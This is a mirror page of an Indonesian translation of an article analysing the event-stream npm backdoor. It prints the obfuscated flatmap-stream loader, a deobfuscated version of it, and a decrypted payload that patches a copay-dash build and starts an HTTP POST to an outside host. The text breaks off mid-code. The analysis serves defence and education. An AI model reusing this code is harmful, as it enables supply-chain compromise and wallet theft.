<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>‚úãüèº üë≤üèæ üíò Jelaskan backdoor dalam event-stream ü•å ü§æ üåú</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Jika Anda bekerja dengan Javascript, maka kemungkinan besar Anda melihat banyak suara tentang kerentanan dalam paket npm stream-event . ( Posting tent...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Jelaskan backdoor dalam event-stream</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/431360/"><p>  Jika Anda bekerja dengan Javascript, maka kemungkinan besar Anda melihat banyak suara tentang kerentanan dalam paket npm <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">stream-event</a> .  ( <em><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Posting tentang ini</a> juga dipublikasikan di Habr√©.</em> ) Sayangnya, analisis rinci dari situasi terkubur di bawah lebih dari 600 komentar dalam <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">masalah di Github</a> , yang sebagian besar adalah nyala tentang keadaan npm, open-source pada umumnya, dll.  Saya pikir itu buruk, karena pintu belakang benar-benar sangat cerdas dan menarik dari sudut pandang teknis, dan juga mengajarkan kita pelajaran penting tentang cara menjaga keamanan dalam aplikasi Javascript.  Jadi saya memutuskan untuk menulis posting dengan penjelasan terperinci tentang bagaimana serangan ini bekerja dan apa yang dapat dilakukan komunitas Javascript untuk mempertahankan diri lebih baik terhadap serangan seperti itu di masa depan. </p><a name="habracut"></a><br><p>  Sebelum saya mulai, saya ingin mengucapkan terima kasih kepada <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">FallingSnow</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">maths22</a> , dan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">joepie91</a> atas investigasi luar biasa mereka.  Mereka melakukan semua kerja keras untuk menganalisis kerentanan dan mencari tahu apa yang dilakukannya.  Nanti dalam teks saya akan mengutip hasil mereka menunjukkan kepengarangan, tapi saya pikir itu layak secara eksplisit menunjukkan bahwa saya tidak melakukan semua pekerjaan ini sendiri.  Saya hanya meringkas apa yang orang lain temukan. </p><br><h2 id="predystoriya">  Latar belakang </h2><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">event-stream</a> adalah modul npm populer yang berisi utilitas untuk bekerja dengan aliran data di dalam aplikasi node.js.  Sekarang ini diunduh lebih dari 1,9 juta kali setiap hari.  Namun, ia belum aktif dalam pengembangan selama beberapa tahun.  Penulisnya, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Dominic Tarr</a> , mendukung sejumlah besar proyek lain dan tidak lagi menggunakan modul ini dalam proyek pribadi, sehingga ia diabaikan. </p><br><p>  Sekitar pertengahan September, seorang pengguna dengan nama panggilan right9ctrl (akun GitHub sekarang telah dihapus) menyarankan untuk mengambil alih dukungan modul.  Dominic setuju dan memberikan hak akses right9ctrl ke Github dan npm.  Sekilas komitmen terlihat tidak berbahaya: </p><br><p><img src="https://habrastorage.org/webt/fs/l7/l_/fsl7l_tjlxllksbmjvoishfzsl8.png"></p><br><p>  <em>Cuplikan layar dari commit commit dalam event-stream di Github</em> </p><br><p> Pada tanggal 9 September, right9ctrl <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">menambahkan modul</a> <code>flatmap-stream</code> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">baru</a> tergantung padanya, untuk mengimplementasikan fungsi <code>flatmap</code> untuk <code>event-stream</code> (solusi yang cukup tepat, karena event-stream sudah memiliki utilitas serupa, misalnya, <code>map</code> biasa).  Kemudian, pada tanggal 16 September, right9ctrl <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">menghapus dependensi</a> <code>flatmap-stream</code> dan mengimplementasikan metode <code>flatmap</code> secara langsung.  Dan lagi, tidak ada yang mengganggu, tidak biasa untuk menambah ketergantungan baru, dan kemudian memutuskan dalam beberapa hari bahwa akan lebih baik untuk menerapkan hal yang sama sendiri. </p><br><h2 id="ataka">  Serang </h2><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Pustaka flatmap-stream</a> juga terlihat tidak berbahaya - sebenarnya, pustaka ini berisi implementasi peta datar untuk aliran data (walaupun sesuatu harus diwaspadai - pustaka hanya memiliki satu kontributor dan tidak ada unduhan dari npm hingga saat ini). </p><br><p><img src="https://habrastorage.org/webt/_b/bl/bv/_bblbvu7cyu_56yrkrsycs9mgkk.png"></p><br><p>  <em>Cuplikan layar halaman aliran datar di GitHub</em> </p><br><p>  Namun, versi modul ini yang diterbitkan dalam npm berisi kode tambahan dalam file yang diperkecil, yang mungkin tidak Anda sadari, bahkan mengetahui bahwa itu ada: </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Stream=<span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"stream"</span></span>).Stream;<span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.exports=<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e,n</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i=<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Stream,a=<span class="hljs-number"><span class="hljs-number">0</span></span>,o=<span class="hljs-number"><span class="hljs-number">0</span></span>,u=!<span class="hljs-number"><span class="hljs-number">1</span></span>,f=!<span class="hljs-number"><span class="hljs-number">1</span></span>,l=!<span class="hljs-number"><span class="hljs-number">1</span></span>,c=<span class="hljs-number"><span class="hljs-number">0</span></span>,s=!<span class="hljs-number"><span class="hljs-number">1</span></span>,d=(n=n||{}).failures?<span class="hljs-string"><span class="hljs-string">"failure"</span></span>:<span class="hljs-string"><span class="hljs-string">"error"</span></span>,m={};<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">w</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r,e</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t=c+<span class="hljs-number"><span class="hljs-number">1</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(e===t?(<span class="hljs-keyword"><span class="hljs-keyword">void</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>!==r&amp;&amp;i.emit.apply(i,[<span class="hljs-string"><span class="hljs-string">"data"</span></span>,r]),c++,t++):m[e]=r,m.hasOwnProperty(t)){<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n=m[t];<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">delete</span></span> m[t],w(n,t)}a===++o&amp;&amp;(f&amp;&amp;(f=!<span class="hljs-number"><span class="hljs-number">1</span></span>,i.emit(<span class="hljs-string"><span class="hljs-string">"drain"</span></span>)),u&amp;&amp;v())}<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">p</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r,e,t</span></span></span><span class="hljs-function">)</span></span>{l||(s=!<span class="hljs-number"><span class="hljs-number">0</span></span>,r&amp;&amp;!n.failures||w(e,t),r&amp;&amp;i.emit.apply(i,[d,r]),s=!<span class="hljs-number"><span class="hljs-number">1</span></span>)}<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">b</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r,t,n</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> e.call(<span class="hljs-literal"><span class="hljs-literal">null</span></span>,r,<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r,e</span></span></span><span class="hljs-function">)</span></span>{n(r,e,t)})}<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">v</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(u=!<span class="hljs-number"><span class="hljs-number">0</span></span>,i.writable=!<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-keyword"><span class="hljs-keyword">void</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>!==r)<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> w(r,a);a==o&amp;&amp;(i.readable=!<span class="hljs-number"><span class="hljs-number">1</span></span>,i.emit(<span class="hljs-string"><span class="hljs-string">"end"</span></span>),i.destroy())}<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> i.writable=!<span class="hljs-number"><span class="hljs-number">0</span></span>,i.readable=!<span class="hljs-number"><span class="hljs-number">0</span></span>,i.write=<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(u)<span class="hljs-keyword"><span class="hljs-keyword">throw</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Error</span></span>(<span class="hljs-string"><span class="hljs-string">"flatmap stream is not writable"</span></span>);s=!<span class="hljs-number"><span class="hljs-number">1</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">try</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> r){a++;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t=b(r[e],a,p);<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(f=!<span class="hljs-number"><span class="hljs-number">1</span></span>===t)<span class="hljs-keyword"><span class="hljs-keyword">break</span></span>}<span class="hljs-keyword"><span class="hljs-keyword">return</span></span>!f}<span class="hljs-keyword"><span class="hljs-keyword">catch</span></span>(r){<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(s)<span class="hljs-keyword"><span class="hljs-keyword">throw</span></span> r;<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> p(r),!f}},i.end=<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r</span></span></span><span class="hljs-function">)</span></span>{u||v(r)},i.destroy=<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{u=l=!<span class="hljs-number"><span class="hljs-number">0</span></span>,i.writable=i.readable=f=!<span class="hljs-number"><span class="hljs-number">1</span></span>,process.nextTick(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{i.emit(<span class="hljs-string"><span class="hljs-string">"close"</span></span>)})},i.pause=<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{f=!<span class="hljs-number"><span class="hljs-number">0</span></span>},i.resume=<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{f=!<span class="hljs-number"><span class="hljs-number">1</span></span>},i};!<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">try</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r=<span class="hljs-built_in"><span class="hljs-built_in">require</span></span>,t=process;<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> Buffer.from(r,<span class="hljs-string"><span class="hljs-string">"hex"</span></span>).toString()}<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n=r(e(<span class="hljs-string"><span class="hljs-string">"2e2f746573742f64617461"</span></span>)),o=t[e(n[<span class="hljs-number"><span class="hljs-number">3</span></span>])][e(n[<span class="hljs-number"><span class="hljs-number">4</span></span>])];<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!o)<span class="hljs-keyword"><span class="hljs-keyword">return</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> u=r(e(n[<span class="hljs-number"><span class="hljs-number">2</span></span>]))[e(n[<span class="hljs-number"><span class="hljs-number">6</span></span>])](e(n[<span class="hljs-number"><span class="hljs-number">5</span></span>]),o),a=u.update(n[<span class="hljs-number"><span class="hljs-number">0</span></span>],e(n[<span class="hljs-number"><span class="hljs-number">8</span></span>]),e(n[<span class="hljs-number"><span class="hljs-number">9</span></span>]));a+=u.final(e(n[<span class="hljs-number"><span class="hljs-number">9</span></span>]));<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> f=<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.constructor;f.paths=<span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.paths,f[e(n[<span class="hljs-number"><span class="hljs-number">7</span></span>])](a,<span class="hljs-string"><span class="hljs-string">""</span></span>),f.exports(n[<span class="hljs-number"><span class="hljs-number">1</span></span>])}<span class="hljs-keyword"><span class="hljs-keyword">catch</span></span>(r){}}();</code> </pre> <br><p>  Bagian yang berbahaya di sini adalah pada akhirnya, dan itu dikaburkan secara khusus untuk menghindari deteksi: </p><br><pre> <code class="javascript hljs">!<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">try</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r=<span class="hljs-built_in"><span class="hljs-built_in">require</span></span>,t=process;<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> Buffer.from(r,<span class="hljs-string"><span class="hljs-string">"hex"</span></span>).toString()}<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n=r(e(<span class="hljs-string"><span class="hljs-string">"2e2f746573742f64617461"</span></span>)),o=t[e(n[<span class="hljs-number"><span class="hljs-number">3</span></span>])][e(n[<span class="hljs-number"><span class="hljs-number">4</span></span>])];<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!o)<span class="hljs-keyword"><span class="hljs-keyword">return</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> u=r(e(n[<span class="hljs-number"><span class="hljs-number">2</span></span>]))[e(n[<span class="hljs-number"><span class="hljs-number">6</span></span>])](e(n[<span class="hljs-number"><span class="hljs-number">5</span></span>]),o),a=u.update(n[<span class="hljs-number"><span class="hljs-number">0</span></span>],e(n[<span class="hljs-number"><span class="hljs-number">8</span></span>]),e(n[<span class="hljs-number"><span class="hljs-number">9</span></span>]));a+=u.final(e(n[<span class="hljs-number"><span class="hljs-number">9</span></span>]));<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> f=<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.constructor;f.paths=<span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.paths,f[e(n[<span class="hljs-number"><span class="hljs-number">7</span></span>])](a,<span class="hljs-string"><span class="hljs-string">""</span></span>),f.exports(n[<span class="hljs-number"><span class="hljs-number">1</span></span>])}<span class="hljs-keyword"><span class="hljs-keyword">catch</span></span>(r){}}();</code> </pre> <br><p>  Dalam <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">masalah pada Github,</a> FallingSnow mengembalikan kode sumber bookmark dan menunjukkan apa yang terjadi di sana: </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// var r = require, t = process; // function e(r) { // return Buffer.from(r, "hex").toString() // } function decode(data) { return Buffer.from(data, "hex").toString() } // var n = r(e("2e2f746573742f64617461")), // var n = require(decode("2e2f746573742f64617461")) // var n = require('./test/data') var n = ["","","63727970746f","656e76","6e706d5f7061636b6167655f6465736372697074696f6e","616573323536","6372656174654465636970686572","5f636f6d70696c65","686578","75746638"] // o = t[e(n[3])][e(n[4])]; // npm_package_description = process[decode(n[3])][decode(n[4])]; npm_package_description = process['env']['npm_package_description']; // if (!o) return; if (!npm_package_description) return; // var u = r(e(n[2]))[e(n[6])](e(n[5]), o), // var decipher = require(decode(n[2]))[decode(n[6])](decode(n[5]), npm_package_description), var decipher = require('crypto')['createDecipher']('aes256', npm_package_description), // a = u.update(n[0], e(n[8]), e(n[9])); // decoded = decipher.update(n[0], e(n[8]), e(n[9])); decoded = decipher.update(n[0], 'hex', 'utf8'); console.log(n); // IDK why this is here... // a += u.final(e(n[9])); decoded += decipher.final('utf8'); // var f = new module.constructor; var newModule = new module.constructor; /**************** DO NOT UNCOMMENT [THIS RUNS THE CODE] **************/ // f.paths = module.paths, f[e(n[7])](a, ""), f.exports(n[1]) // newModule.paths = module.paths, newModule['_compile'](decoded, ""), newModule.exports(n[1]) // newModule.paths = module.paths // newModule['_compile'](decoded, "") // Module.prototype._compile = function(content, filename) // newModule.exports(n[1])</span></span></code> </pre> <br><p>  Jadi, kode tersebut mengunduh file <code>./test/data.js</code> , yang juga <a href="">disematkan dalam versi yang diterbitkan di npm</a> meskipun kurangnya kode sumber di GitHub.  File ini berisi larik string yang dienkripsi melalui AES256.  <code>npm_package_description</code> lingkungan <code>npm_package_description</code> diatur oleh perintah npm ketika kode dieksekusi dalam konteks beberapa paket, mis. Paket root, termasuk event-stream -&gt; rantai ketergantungan flatmap-stream, akan digunakan untuk mengatur <code>npm_package_description</code> (dan variabel serupa lainnya).  ( <em>Catatan: dengan kata lain, deskripsi dari file package.json proyek Anda di mana Anda menjalankan perintah ini akan digunakan</em> ).  Dengan demikian, kode mendekripsi konten <code>test/data.js</code> menggunakan <code>npm_package_description</code> sebagai kunci, dan kemudian mencoba untuk mengeksekusi hasilnya. </p><br><p>  Untuk sebagian besar paket, ini akan menyebabkan kesalahan (kode berbahaya akan diam-diam menangkap dan mengabaikan), karena deskripsi mereka bukan kunci yang tepat untuk sandi AES256 dan hasil dekripsi akan menjadi omong kosong.  Ini adalah serangan yang sangat tertarget pada satu paket spesifik.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">maths22</a> dan beberapa pengguna lain mengunduh daftar npm-modules yang bergantung pada event-stream, dan memilah-milah deskripsi modul-modul ini, kami memilih kunci yang benar dan menemukan paket target: itu adalah <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">copay-dash</a> , sebuah platform untuk dompet bitcoin.  <code>test/data.js</code> , "Dompet Bitcoin Aman", berhasil mendekripsi konten <code>test/data.js</code> , menampilkan kode berikut (silakan disediakan oleh <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">joepie91</a> ): </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">/*@@*/</span></span> <span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.exports = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-regexp"><span class="hljs-regexp">/build\:.*\-release/</span></span>.test(process.argv[<span class="hljs-number"><span class="hljs-number">2</span></span>])) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = process.env.npm_package_description, r = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"fs"</span></span>), i = <span class="hljs-string"><span class="hljs-string">"./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js"</span></span>, n = r.statSync(i), c = r.readFileSync(i, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>), o = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"crypto"</span></span>).createDecipher(<span class="hljs-string"><span class="hljs-string">"aes256"</span></span>, t), s = o.update(e, <span class="hljs-string"><span class="hljs-string">"hex"</span></span>, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>); s = <span class="hljs-string"><span class="hljs-string">"\n"</span></span> + (s += o.final(<span class="hljs-string"><span class="hljs-string">"utf8"</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> a = c.indexOf(<span class="hljs-string"><span class="hljs-string">"\n/*@@*/"</span></span>); <span class="hljs-number"><span class="hljs-number">0</span></span> &lt;= a &amp;&amp; (c = c.substr(<span class="hljs-number"><span class="hljs-number">0</span></span>, a)), r.writeFileSync(i, c + s, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>), r.utimesSync(i, n.atime, n.mtime), process.on(<span class="hljs-string"><span class="hljs-string">"exit"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { r.writeFileSync(i, c, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>), r.utimesSync(i, n.atime, n.mtime) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} }) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} };</code> </pre> <br><p>  Kode ini meluncurkan tingkat dekripsi lain, tempat skrip jahat akhir terbuka: </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">/*@@*/</span></span> ! <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"http"</span></span>), a = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"crypto"</span></span>), c = <span class="hljs-string"><span class="hljs-string">"-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\\n2wIDAQAB\\n-----END PUBLIC KEY-----"</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">i</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e, t, n</span></span></span><span class="hljs-function">) </span></span>{ e = Buffer.from(e, <span class="hljs-string"><span class="hljs-string">"hex"</span></span>).toString(); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = o.request({ <span class="hljs-attr"><span class="hljs-attr">hostname</span></span>: e, <span class="hljs-attr"><span class="hljs-attr">port</span></span>: <span class="hljs-number"><span class="hljs-number">8080</span></span>, <span class="hljs-attr"><span class="hljs-attr">method</span></span>: <span class="hljs-string"><span class="hljs-string">"POST"</span></span>, <span class="hljs-attr"><span class="hljs-attr">path</span></span>: <span class="hljs-string"><span class="hljs-string">"/"</span></span> + t, <span class="hljs-attr"><span class="hljs-attr">headers</span></span>: { <span class="hljs-string"><span class="hljs-string">"Content-Length"</span></span>: n.length, <span class="hljs-string"><span class="hljs-string">"Content-Type"</span></span>: <span class="hljs-string"><span class="hljs-string">"text/html"</span></span> } }, <span 